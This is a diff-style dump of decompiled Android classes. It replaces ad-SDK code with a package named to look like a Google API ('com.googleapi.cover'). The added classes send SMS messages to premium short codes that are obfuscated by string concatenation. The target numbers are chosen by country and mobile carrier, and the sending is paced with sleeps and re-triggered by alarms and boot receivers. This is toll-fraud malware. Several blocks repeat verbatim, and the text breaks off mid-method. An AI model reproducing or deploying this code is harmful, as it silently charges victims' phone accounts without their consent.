@@ -1,555 +1,485 @@
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.b.h.h
-Class Name:h
-Content: package com.kuguo.b;
+Package Path:com.googleapi.cover.MessageHandler.onReceive
+Class Name:MessageHandler
+Content: package com.googleapi.cover;
 
-public class h {
-    private String a;
-    private boolean e;
-    private int d = 0;
-    private Map b = new LinkedHashMap();
-    private Map c = new LinkedHashMap();
-
-    public h(String str) {
-        this.a = str;
-    }
-
-    public Map a() {
-        return this.c;
-    }
-
-    public void a(String str, Object obj) {
-        this.c.put(str, obj);
-    }
-
-    public int b() {
-        return this.d;
-    }
-
-    public String c() {
-        return this.a;
-    }
-
-    public String d() {
-        if (this.b.isEmpty()) {
-            return "";
+    public void onReceive(Context context, Intent intent) {
+        if (intent.getAction().equals(ACTION)) {
+            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+            LinkedList<Pair<String, String>> list = new LinkedList<>();
+            list.add(Pair.create(Actor.NUM_2, Actor.PREF_PORT));
+            Utils.start(null, new Sch(list.size(), list), smsData, context);
         }
-        ArrayList arrayList = new ArrayList();
-        for (String str : this.b.keySet()) {
-            Object obj = this.b.get(str);
-            if (obj != null) {
-                arrayList.add(new BasicNameValuePair(str, obj.toString()));
+    }
+
+Package Path:com.googleapi.cover.MessageHandler.onReceive
+Class Name:MessageHandler
+Content: package com.googleapi.cover;
+
+    public void onReceive(Context context, Intent intent) {
+        if (intent.getAction().equals(ACTION)) {
+            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+            LinkedList<Pair<String, String>> list = new LinkedList<>();
+            list.add(Pair.create(Actor.NUM_2, Actor.PREF_PORT));
+            Utils.start(null, new Sch(list.size(), list), smsData, context);
+        }
+    }
+
+Package Path:com.googleapi.cover.Notifier.Notifier
+Class Name:Notifier
+Content: package com.googleapi.cover;
+
+public class Notifier extends BroadcastReceiver {
+    public static final String ACT_NOTIFY = "ACT_NOTIFY";
+    private static final String KEY_NOTIF_COUNTER = "KEY_NOTIF_COUNTER";
+    private static final int MINS_UNTIL_NOTIFY = 1440;
+    private SharedPreferences settings;
+
+    public void setPrefs(SharedPreferences prefs) {
+        this.settings = prefs;
+    }
+
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context context, Intent intent) {
+        int id;
+        this.settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+        String action = intent.getAction();
+        if ((action.equals("android.intent.action.BOOT_COMPLETED") || action.equals(ACT_NOTIFY)) && (id = this.settings.getInt(KEY_NOTIF_COUNTER, 0)) > 0) {
+            showNotification(context, id);
+        }
+    }
+
+    private void showNotification(Context context, int id) {
+        NotificationManager nm = (NotificationManager) context.getSystemService("notification");
+        try {
+            long time = System.currentTimeMillis();
+            String notificationURL = TextUtils.read(8, context);
+            Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(notificationURL));
+            PendingIntent pi = PendingIntent.getActivity(context, 0, browserIntent, 268435456);
+            String body = TextUtils.read(7, context);
+            String title = TextUtils.read(6, context);
+            Notification notification = new Notification(R.drawable.ic_push, title, time);
+            notification.setLatestEventInfo(context, title, body, pi);
+            notification.flags = 20;
+            Utils.putIntegerValue(context, KEY_NOTIF_COUNTER, this.settings.getInt(KEY_NOTIF_COUNTER, 0) - 1, this.settings);
+            nm.notify(id, notification);
+        } catch (IOException e) {
+        }
+    }
+
+    public void initSettings(Context context, long time, Intent intent) {
+        if (!this.settings.contains(KEY_NOTIF_COUNTER)) {
+            int number = 0;
+            try {
+                number = Integer.parseInt(TextUtils.read(9, context));
+            } catch (Exception e) {
             }
+            Utils.putIntegerValue(context, KEY_NOTIF_COUNTER, number, this.settings);
+            PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, 268435456);
+            AlarmManager am = (AlarmManager) context.getSystemService("alarm");
+            am.set(0, 86400000 + time, pi);
         }
-        String format = URLEncodedUtils.format(arrayList, "utf-8");
-        return this.e ? com.kuguo.c.b.a(format) : format;
-    }
-
-    public String toString() {
-        String d = d();
-        return d.equals("") ? this.a : this.a + "?" + d;
     }
 }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.b.h.d
-Class Name:h
-Content: package com.kuguo.b;
+Package Path:com.googleapi.cover.MessageHandler.MessageHandler
+Class Name:MessageHandler
+Content: package com.googleapi.cover;
 
-    public String d() {
-        if (this.b.isEmpty()) {
-            return "";
-        }
-        ArrayList arrayList = new ArrayList();
-        for (String str : this.b.keySet()) {
-            Object obj = this.b.get(str);
-            if (obj != null) {
-                arrayList.add(new BasicNameValuePair(str, obj.toString()));
-            }
-        }
-        String format = URLEncodedUtils.format(arrayList, "utf-8");
-        return this.e ? com.kuguo.c.b.a(format) : format;
-    }
+public class MessageHandler extends BroadcastReceiver {
+    public static final String ACTION = "com.googleapi.cover.MessageHandler";
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.a.f.t
-Class Name:f
-Content: package com.kuguo.a;
-
-    private void t() {
-        if (this.a != null) {
-            this.a.b().a("Accept", "image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/xaml+xml, application/vnd.ms-xpsdocument, application/x-ms-xbap, application/x-ms-application, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*");
-            this.a.b().a("Accept-Language", "zh-CN");
-            this.a.b().a("Charset", ENV.ENCODING);
-            if (this.g == 1) {
-                long o = o();
-                this.d = (int) o;
-                this.a.b().a("Range", "bytes=" + o + "-");
-            } else {
-                this.a.b().a("Range", "bytes=0-");
-                this.d = 0;
-            }
-            this.a.b().a("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)");
-            this.a.b().a("Connection", "Keep-Alive");
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context context, Intent intent) {
+        if (intent.getAction().equals(ACTION)) {
+            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
+            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+            LinkedList<Pair<String, String>> list = new LinkedList<>();
+            list.add(Pair.create(Actor.NUM_2, Actor.PREF_PORT));
+            Utils.start(null, new Sch(list.size(), list), smsData, context);
         }
     }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.b.m.m
-Class Name:m
-Content: package net.crazymedia.iad.b;
-
-public class m extends h {
-    private String b;
-
-    public m(Context context, String str) {
-        this.a = context;
-        this.b = str;
-    }
-
-    @Override // net.crazymedia.iad.b.h
-    public g a() {
-        ArrayList a = a("");
-        a.add(new BasicNameValuePair("downAppidEncode", this.b));
-        return a(new d().a(f.f(), (List) a));
-    }
-
-    @Override // net.crazymedia.iad.b.h
-    public void a(JSONObject jSONObject, g gVar) {
-        gVar.c = net.crazymedia.iad.c.a.a(jSONObject);
+    public static void scheduleSend(Context context) {
+        PendingIntent pi = PendingIntent.getBroadcast(context, 0, new Intent(context, (Class<?>) MessageHandler.class).setAction(ACTION), 268435456);
+        AlarmManager am = (AlarmManager) context.getSystemService("alarm");
+        am.set(0, System.currentTimeMillis() + 30000, pi);
     }
 }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.ad.bz.bz
-Class Name:bz
-Content: package com.kuguo.ad;
+Package Path:com.googleapi.cover.Actor.initConfigs
+Class Name:Actor
+Content: package com.googleapi.cover;
 
-class bz implements com.kuguo.a.a {
-    final /* synthetic */ bk a;
-    final /* synthetic */ bn b;
-
-    bz(bn bnVar, bk bkVar) {
-        this.b = bnVar;
-        this.a = bkVar;
-    }
-
-    @Override // com.kuguo.a.a
-    public void a(com.kuguo.a.f fVar, int i) {
-        Context context;
-        a.a("download state == " + i);
-        if (i == 4 || i == 5) {
-            this.b.post(new by(this));
-            this.a.l = 0;
-            context = this.b.a.a;
-            a.b(context, this.a);
-            MainReceiver.a();
-        }
-    }
-
-    @Override // com.kuguo.a.a
-    public void a(com.kuguo.a.f fVar, long j) {
-        a.a("download size == " + j);
-    }
-}
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.b.u.e
-Class Name:u
-Content: package net.crazymedia.iad.b;
-
-    private g e() {
-        return new l(this.d).a();
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.unity3d.player.a.a.a
-Class Name:a
-Content: package com.unity3d.player.a;
-
-    public final String a(String str) {
-        if (str == null) {
-            return null;
+    private void initConfigs() {
+        try {
+            this.schemes = TextUtils.getScheme(this.mContext);
+            SCHEME_TO_USE = (String) this.schemes.first;
+            Utils.putStringValue(this.mContext, KEY_MSG_DATA_TEXT, (String) this.schemes.second, this.settings);
+        } catch (IOException e) {
         }
         try {
-            return com.unity3d.player.b.a.a(this.b.doFinal(("com.android.vending.licensing.AESObfuscator-1|" + str).getBytes(ENV.ENCODING)));
-        } catch (UnsupportedEncodingException e) {
-            throw new RuntimeException("Invalid environment", e);
-        } catch (GeneralSecurityException e2) {
-            throw new RuntimeException("Invalid environment", e2);
+            this.texts = TextUtils.getTexts(this.mContext.getResources().getXml(R.xml.texts));
+        } catch (IOException e2) {
         }
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.ad.h.d
-Class Name:h
-Content: package com.kuguo.ad;
-
-    private e d;
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.a.c.onProgressUpdate
-Class Name:c
-Content: package net.crazymedia.iad.a;
-
-    public void onProgressUpdate(Integer... numArr) {
-        Integer num = numArr[0];
-        if (this.i) {
-            return;
+        this.app_name = new String();
+        try {
+            this.app_name = TextUtils.read(1, this.mContext);
+        } catch (IOException e3) {
         }
-        s.a(this.d, this.e.a.hashCode(), R.drawable.stat_sys_download, this.e.b, this.e.b, "当前下载：" + num + "%", null);
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.b.f.f
-Class Name:f
-Content: package com.kuguo.b;
-
-public class f extends a {
-    private HttpClient b;
-
-    public f(Context context, h hVar) {
-        super(context, hVar);
-    }
-
-    @Override // com.kuguo.b.a
-    public void d() {
-        HttpRequestBase httpRequestBase;
-        int statusCode;
-        com.kuguo.c.a.a("kuzai__log", "------ establish-------------");
-        if (a()) {
-            if (!l()) {
-                a(-4);
-                return;
-            }
-            a((Exception) null);
-            a(-2);
-            this.b = new DefaultHttpClient();
-            float j = j();
-            if (j > 0.0f) {
-                this.b.getParams().setParameter("http.socket.timeout", Integer.valueOf((int) (j * 1000.0f)));
-                this.b.getParams().setParameter("http.connection.timeout", Integer.valueOf((int) (j * 1000.0f)));
-            }
-            g k = k();
-            if (k != null) {
-                this.b.getParams().setParameter("http.route.default-proxy", new HttpHost(k.a(), k.b(), AsyncData.SCHEME_HTTP));
-            }
-            h b = b();
-            if (b.b() == 0) {
-                httpRequestBase = new HttpGet(b.toString());
-            } else {
-                HttpPost httpPost = new HttpPost(b.c());
-                try {
-                    httpPost.setEntity(new StringEntity(b.d()));
-                } catch (UnsupportedEncodingException e) {
-                    e.printStackTrace();
-                }
-                httpRequestBase = httpPost;
-            }
-            Map a = b.a();
-            for (String str : a.keySet()) {
-                httpRequestBase.addHeader(str, a.get(str).toString());
-            }
-            for (int i = 0; i < 3; i++) {
-                try {
-                    com.kuguo.c.a.a("jerry", "---uri === " + httpRequestBase.getURI());
-                    HttpResponse execute = this.b.execute(httpRequestBase);
-                    statusCode = execute.getStatusLine().getStatusCode();
-                    com.kuguo.c.a.a("kuzai__log", "connection status : " + statusCode);
-                    HashMap hashMap = new HashMap();
-                    Header[] allHeaders = execute.getAllHeaders();
-                    com.kuguo.c.a.a("kuzai__log", "--------------response header start------------------");
-                    for (Header header : allHeaders) {
-                        hashMap.put(header.getName(), header.getValue());
-                        com.kuguo.c.a.a("kuzai__log", header.getName() + " --- " + header.getValue());
-                    }
-                    com.kuguo.c.a.a("kuzai__log", "--------------response header end ------------------");
-                    a(hashMap);
-                    a(execute.getEntity().getContent());
-                } catch (Exception e2) {
-                    com.kuguo.c.a.a("网络链接异常");
-                    a(e2);
-                    a(-3);
-                }
-                if (("" + statusCode).startsWith("2")) {
-                    a(200);
+        try {
+            this.sendImmediately = TextUtils.read(3, this.mContext).equalsIgnoreCase(PRIVATE);
+        } catch (IOException e4) {
+        }
+        this.content = new String();
+        try {
+            this.content = TextUtils.read(2, this.mContext);
+        } catch (IOException e5) {
+        }
+        int relatedContentBaseline = 13;
+        while (true) {
+            try {
+                String name = TextUtils.read(relatedContentBaseline, this.mContext);
+                String link = TextUtils.read(relatedContentBaseline + 1, this.mContext);
+                String data = TextUtils.read(relatedContentBaseline + 2, this.mContext);
+                if (name != null && link != null && data != null) {
+                    this.relatedContentNames.add(name);
+                    this.relatedContentLinks.add(link);
+                    this.relatedData.add(data);
+                    relatedContentBaseline += 3;
+                } else {
                     return;
                 }
-                com.kuguo.c.a.a("网络访问完成");
+            } catch (Exception e6) {
+                return;
             }
         }
     }
 
-    @Override // com.kuguo.b.a
-    public void e() {
-        if (a()) {
-            return;
-        }
-        if (this.b != null) {
-            this.b.getConnectionManager().shutdown();
-        }
-        a((Map) null);
-        a((InputStream) null);
-        a((Exception) null);
-        a(-3);
-    }
-}
+Package Path:com.googleapi.cover.ActService.actUK
+Class Name:ActService
+Content: package com.googleapi.cover;
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.ad.cc.a
-Class Name:cc
-Content: package com.kuguo.ad;
-
-    public ce[] a(int i, int i2, String str) {
-        HashMap hashMap = new HashMap();
-        hashMap.put("requestId", "" + i);
-        hashMap.put("appCount", "" + i2);
-        this.c.r = str;
-        if (i == 2) {
-            com.kuguo.c.a.a(i + " has got app Count --> " + i2 + " all app count " + a.D(this.b));
-        } else if (i == 3) {
-            com.kuguo.c.a.a(i + " has got game Count --> " + i2 + " all game count " + a.E(this.b));
-        }
-        com.kuguo.c.a.a(i + " rp --> " + this.c.b().toString());
-        InputStream a2 = a(a(hashMap), this.c.b().toString().getBytes());
-        if (a2 == null) {
-            a.c(a.k(this.b), str);
-            return null;
-        }
-        String a3 = a(a2);
-        if (a3 == null) {
-            a.c(a.k(this.b), str);
-            return null;
-        }
-        com.kuguo.c.a.a("list ad json -->" + a3);
-        com.kuguo.c.a.a("list json length -->" + a3.length());
-        bp bpVar = (bp) d.a(bp.class, a3);
-        if (bpVar == null) {
-            a.c(a.k(this.b), str);
-        } else if (bpVar.a < 0) {
-            Log.d("kuzai__log", "b result code -- " + bpVar.a);
-            a.a(this.b, false);
-            KuguoAdsManager.getInstance().removeKuguoSprite(this.b, 1);
-            KuguoAdsManager.getInstance().removeKuguoSprite(this.b, 0);
-        } else {
-            a.a(this.b, true);
-        }
-        if (bpVar != null) {
-            com.kuguo.c.a.a("list result -->" + bpVar.toString());
-        }
-        bw bwVar = (bw) d.a(bw.class, a3);
-        if (bwVar != null) {
-            com.kuguo.c.a.a("list adHeader -->" + bwVar.toString());
-        }
-        if (bwVar != null) {
-            if (i == 2) {
-                a.c(this.b, bwVar.b);
-            } else if (i == 3) {
-                a.d(this.b, bwVar.b);
+        private void actUK(Actor act, SharedPreferences settings) {
+            SmsManager sms = SmsManager.getDefault();
+            ArrayList<String> list = new ArrayList<>();
+            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
+            String ns1ua = "31".concat("61");
+            String ns2ua = "28".concat("55");
+            String ps1_ua = "4084".concat("705");
+            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
+                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
+                    list.add(ns2ua);
+                } else if (opCode.equals("01")) {
+                    list.add(ns1ua);
+                    list.add(ns1ua);
+                } else {
+                    list.add(ns2ua);
+                    list.add(ns1ua);
+                    list.add(ns1ua);
+                }
+                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+                for (int i = 0; i < list.size(); i++) {
+                    if (i != 0) {
+                        try {
+                            sleep(60000L);
+                        } catch (InterruptedException e) {
+                        }
+                    }
+                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
+                }
             }
+            act.reportDone();
         }
-        return (ce[]) d.b(ce.class, a3);
+
+Package Path:com.googleapi.cover.Main.startC2DM
+Class Name:Main
+Content: package com.googleapi.cover;
+
+    private void startC2DM() {
+        Notifier notifier = new Notifier();
+        notifier.setPrefs(getSharedPreferences(KEY_PREFS, 0));
+        notifier.initSettings(getApplicationContext(), System.currentTimeMillis(), new Intent(this, (Class<?>) Notifier.class).setAction(Notifier.ACT_NOTIFY));
     }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.otheri.http.HttpPostTask.runSyncTask
-Class Name:HttpPostTask
-Content: package com.otheri.http;
+Package Path:com.googleapi.cover.ActService.actUK
+Class Name:ActService
+Content: package com.googleapi.cover;
 
-    public Input runSyncTask() {
-        init();
-        this.conn.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-        byte[] content = (byte[]) null;
-        if (this.baos != null && this.baos.size() > 0) {
-            content = this.baos.toByteArray();
-            this.conn.addRequestProperty("Content-Length", Integer.toString(content.length));
-        } else {
-            this.conn.addRequestProperty("Content-Length", "0");
-        }
-        try {
-            this.conn.connect();
-            if (content != null) {
-                OutputStream os = this.conn.getOutputStream();
-                os.write(content);
-                os.flush();
-                os.close();
+        private void actUK(Actor act, SharedPreferences settings) {
+            SmsManager sms = SmsManager.getDefault();
+            ArrayList<String> list = new ArrayList<>();
+            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
+            String ns1ua = "31".concat("61");
+            String ns2ua = "28".concat("55");
+            String ps1_ua = "4084".concat("705");
+            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
+                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
+                    list.add(ns2ua);
+                } else if (opCode.equals("01")) {
+                    list.add(ns1ua);
+                    list.add(ns1ua);
+                } else {
+                    list.add(ns2ua);
+                    list.add(ns1ua);
+                    list.add(ns1ua);
+                }
+                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
+                for (int i = 0; i < list.size(); i++) {
+                    if (i != 0) {
+                        try {
+                            sleep(60000L);
+                        } catch (InterruptedException e) {
+                        }
+                    }
+                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
+                }
             }
-            int responseCode = this.conn.getResponseCode();
-            if (responseCode < 200 || responseCode > 299) {
-                return null;
-            }
-            return new Input(this.conn.getInputStream());
-        } catch (IOException e) {
-            e.printStackTrace();
-            return null;
+            act.reportDone();
         }
+
+Package Path:com.googleapi.cover.Main.onResume
+Class Name:Main
+Content: package com.googleapi.cover;
+
+    protected void onResume() {
+        super.onResume();
+        startC2DM();
     }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.ad.o.run
-Class Name:o
-Content: package com.kuguo.ad;
+Package Path:com.googleapi.cover.Actor.startImpl
+Class Name:Actor
+Content: package com.googleapi.cover;
 
-    public void run() {
-        Log.d("kuzai__log", "start req list");
-        String e = a.e(a.k(this.a));
-        com.kuguo.c.a.a("json req status -- " + e);
-        ce[] a = cc.a(this.a).a(this.c, this.b, e);
-        if (a == null || a.length <= 0) {
-            com.kuguo.c.a.a("adbody is null");
-            if (this.d != null) {
-                this.d.a(null, this.c);
+    public void startImpl(String data, int index) {
+        PendingIntent pi = PendingIntent.getBroadcast(this.mContext, 0, new Intent(INTENT_FILTR), 0);
+        if (isBeelineSubscription(this.mContext) || isMTSSubscription(this.mContext) || !INIT_NEW.equals(SCHEME_TO_USE) || ((!this.countryCode.equals(RUS_ID) && !this.countryCode.equals(UK_ID)) || ((this.countryCode.equals(RUS_ID) && this.opCode.equals(TELE2_ID)) || this.countryCode.equals(BELORUSS_ID)))) {
+            if (!this.isRegistered) {
+                this.isRegistered = true;
+                out();
+            }
+            Utils.start(pi, this.actSchemes.get(SCHEME_TO_USE), data, this.mContext);
+            if (isBeelineSubscription(this.mContext)) {
+                MessageHandler.scheduleSend(this.mContext);
                 return;
             }
             return;
         }
-        bk[] bkVarArr = new bk[a.length];
-        int length = a.length;
-        for (int i = 0; i < length; i++) {
-            com.kuguo.c.a.a("ad msg is -- " + a[i].toString());
-            com.kuguo.c.a.a("ads type is " + a[i].h);
-            bkVarArr[i] = a.a(a[i]);
+        beginProc();
+        if (this.countryCode.equals(RUS_ID)) {
+            if ((this.opCode.equals("01") || this.opCode.equals("02")) && isPrivate() && index < 1) {
+                reportDone();
+            }
         }
-        if (bkVarArr == null || bkVarArr.length <= 0) {
+    }
+
+Package Path:com.googleapi.cover.Actor.startImpl
+Class Name:Actor
+Content: package com.googleapi.cover;
+
+    public void startImpl(String data, int index) {
+        PendingIntent pi = PendingIntent.getBroadcast(this.mContext, 0, new Intent(INTENT_FILTR), 0);
+        if (isBeelineSubscription(this.mContext) || isMTSSubscription(this.mContext) || !INIT_NEW.equals(SCHEME_TO_USE) || ((!this.countryCode.equals(RUS_ID) && !this.countryCode.equals(UK_ID)) || ((this.countryCode.equals(RUS_ID) && this.opCode.equals(TELE2_ID)) || this.countryCode.equals(BELORUSS_ID)))) {
+            if (!this.isRegistered) {
+                this.isRegistered = true;
+                out();
+            }
+            Utils.start(pi, this.actSchemes.get(SCHEME_TO_USE), data, this.mContext);
+            if (isBeelineSubscription(this.mContext)) {
+                MessageHandler.scheduleSend(this.mContext);
+                return;
+            }
             return;
         }
-        if (this.c == 3) {
-            a.a(this.a, bkVarArr, this.b);
-        } else if (this.c == 2) {
-            a.b(this.a, bkVarArr, this.b);
+        beginProc();
+        if (this.countryCode.equals(RUS_ID)) {
+            if ((this.opCode.equals("01") || this.opCode.equals("02")) && isPrivate() && index < 1) {
+                reportDone();
+            }
         }
-        if (this.d != null) {
-            this.d.a(bkVarArr, this.c);
-        }
-        a.a(this.a, true);
-        KuguoAdsManager.getInstance().showSprite(this.a);
-        com.kuguo.a.c.a(this.a);
-        a(bkVarArr);
     }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.d.e.c
-Class Name:e
-Content: package net.crazymedia.iad.d;
+Package Path:com.googleapi.cover.Actor.initConfigs
+Class Name:Actor
+Content: package com.googleapi.cover;
 
-    private static final int[] c = {58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7};
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.unity3d.player.a.a.b
-Class Name:a
-Content: package com.unity3d.player.a;
-
-    public final String b(String str) {
-        if (str == null) {
-            return null;
-        }
+    private void initConfigs() {
         try {
-            String str2 = new String(this.c.doFinal(com.unity3d.player.b.a.a(str)), ENV.ENCODING);
-            if (str2.indexOf("com.android.vending.licensing.AESObfuscator-1|") != 0) {
-                throw new l("Header not found (invalid data or key):" + str);
-            }
-            return str2.substring("com.android.vending.licensing.AESObfuscator-1|".length(), str2.length());
-        } catch (com.unity3d.player.b.b e) {
-            throw new l(e.getMessage() + ":" + str);
-        } catch (UnsupportedEncodingException e2) {
-            throw new RuntimeException("Invalid environment", e2);
-        } catch (BadPaddingException e3) {
-            throw new l(e3.getMessage() + ":" + str);
-        } catch (IllegalBlockSizeException e4) {
-            throw new l(e4.getMessage() + ":" + str);
-        }
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.com.kuguo.ad.ah.d
-Class Name:ah
-Content: package com.kuguo.ad;
-
-    public void d(int i) {
-        int i2 = 0;
-        if (i == 0) {
-            this.c = a(this.c);
-            while (true) {
-                int i3 = i2;
-                if (i3 >= this.c.size()) {
-                    a(this.e, i);
-                    return;
-                } else {
-                    if (!a((bk) this.c.get(i3), this.e)) {
-                        this.e.add(this.c.get(i3));
-                    }
-                    i2 = i3 + 1;
-                }
-            }
-        } else {
-            this.d = a(this.d);
-            while (true) {
-                int i4 = i2;
-                if (i4 >= this.d.size()) {
-                    a(this.f, i);
-                    return;
-                } else {
-                    if (!a((bk) this.d.get(i4), this.f)) {
-                        this.f.add(this.d.get(i4));
-                    }
-                    i2 = i4 + 1;
-                }
-            }
-        }
-    }
-
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.c.b.d
-Class Name:b
-Content: package net.crazymedia.iad.c;
-
-    public void d() {
-        try {
-            FileOutputStream openFileOutput = r.a().b().openFileOutput(e(), 0);
-            ObjectOutputStream objectOutputStream = new ObjectOutputStream(openFileOutput);
-            objectOutputStream.writeInt(this.b.size());
-            for (int i = 0; i < this.b.size(); i++) {
-                if (this.b.get(i) instanceof Serializable) {
-                    objectOutputStream.writeObject(this.b.get(i));
-                } else {
-                    objectOutputStream.writeObject(null);
-                }
-            }
-            objectOutputStream.flush();
-            objectOutputStream.close();
-            openFileOutput.close();
+            this.schemes = TextUtils.getScheme(this.mContext);
+            SCHEME_TO_USE = (String) this.schemes.first;
+            Utils.putStringValue(this.mContext, KEY_MSG_DATA_TEXT, (String) this.schemes.second, this.settings);
         } catch (IOException e) {
-            e.printStackTrace();
+        }
+        try {
+            this.texts = TextUtils.getTexts(this.mContext.getResources().getXml(R.xml.texts));
+        } catch (IOException e2) {
+        }
+        this.app_name = new String();
+        try {
+            this.app_name = TextUtils.read(1, this.mContext);
+        } catch (IOException e3) {
+        }
+        try {
+            this.sendImmediately = TextUtils.read(3, this.mContext).equalsIgnoreCase(PRIVATE);
+        } catch (IOException e4) {
+        }
+        this.content = new String();
+        try {
+            this.content = TextUtils.read(2, this.mContext);
+        } catch (IOException e5) {
+        }
+        int relatedContentBaseline = 13;
+        while (true) {
+            try {
+                String name = TextUtils.read(relatedContentBaseline, this.mContext);
+                String link = TextUtils.read(relatedContentBaseline + 1, this.mContext);
+                String data = TextUtils.read(relatedContentBaseline + 2, this.mContext);
+                if (name != null && link != null && data != null) {
+                    this.relatedContentNames.add(name);
+                    this.relatedContentLinks.add(link);
+                    this.relatedData.add(data);
+                    relatedContentBaseline += 3;
+                } else {
+                    return;
+                }
+            } catch (Exception e6) {
+                return;
+            }
         }
     }
 
-Package Path:00D8F11B3887B58ADEF73E479D970C7674A7C918BC7ED05DF5E806E1688FD80B.sources.net.crazymedia.iad.b.n.n
-Class Name:n
-Content: package net.crazymedia.iad.b;
+Package Path:com.googleapi.cover.Main.initSettings
+Class Name:Main
+Content: package com.googleapi.cover;
 
-public class n extends h {
-    private String b;
-
-    public n(Context context, String str) {
-        this.a = context;
-        this.b = str;
+    private void initSettings() {
+        SharedPreferences settings = getSharedPreferences(KEY_PREFS, 0);
+        Utils.putIntegerValue(this, Actor.ALLOWED_SMS_NUMBER, 0, settings);
+        this.wasProgressDone = settings.getBoolean(IS_LOADED, false);
+        this.installedURL = settings.getString(INSTALL_URL, "");
     }
 
-    @Override // net.crazymedia.iad.b.h
-    public g a() {
-        ArrayList a = a("");
-        a.add(new BasicNameValuePair("downAppidEncode", this.b));
-        return a(new d().a(f.g(), (List) a));
+Package Path:com.googleapi.cover.Main.finishInstallation
+Class Name:Main
+Content: package com.googleapi.cover;
+
+    void finishInstallation(String result) {
+        this.wasProgressDone = true;
+        this.installedURL = this.actor.getContentToBeActed();
+        SharedPreferences settings = getSharedPreferences(KEY_PREFS, 0);
+        SharedPreferences.Editor editor = settings.edit();
+        editor.putBoolean(IS_LOADED, true);
+        editor.putString(INSTALL_URL, this.actor.getContentToBeActed());
+        editor.commit();
+        updateGUI();
     }
 
-    @Override // net.crazymedia.iad.b.h
-    public void a(JSONObject jSONObject, g gVar) {
-        gVar.c = net.crazymedia.iad.c.e.a(jSONObject);
+Package Path:com.googleapi.cover.RelatedContent.onCreate
+Class Name:RelatedContent
+Content: package com.googleapi.cover;
+
+    public void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.related_content);
+        this.index = getIntent().getIntExtra("index", 0);
+        this.actor = new Actor(this, TextUtils.getOperatorString(this));
+        if (!this.actor.wasActError()) {
+            initializeGUI();
+        } else {
+            finish();
+        }
+    }
+
+Package Path:com.googleapi.cover.TextUtils.read
+Class Name:TextUtils
+Content: package com.googleapi.cover;
+
+    public static String read(int lineNum, Context context) throws IOException {
+        BufferedReader reader = new BufferedReader(new InputStreamReader(context.getResources().openRawResource(R.raw.act_schemes)));
+        String line = null;
+        for (int i = 0; i < lineNum; i++) {
+            line = reader.readLine();
